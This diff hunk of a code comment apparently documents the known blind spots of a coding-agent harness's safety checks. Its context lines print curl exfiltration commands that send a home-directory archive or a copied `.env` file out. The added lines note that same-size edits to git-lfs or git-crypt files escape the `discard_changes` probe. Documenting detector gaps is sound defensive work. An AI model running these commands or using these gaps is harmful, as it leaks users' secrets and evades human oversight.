@@ -22,6 +22,8 @@
  *   `tar czf - ~ | curl -T - ...`.
  * - A secret copied to another file first is sent under that file's name:
  *   `cp .env /tmp/x && curl -F f=@/tmp/x ...`.
+ * - A same-size edit to a file a configured filter driver handles (git-lfs, git-crypt) is not seen
+ *   by `discard_changes`: the probe runs no filter, so it compares such a file by size.
  *
  * `discard_changes` and `kills_harness` confirm a match with a read-only probe (the
  * `@oh-my-pi/pi-natives/vcs` discard check, `pgrep`) and fire only when the probe shows something
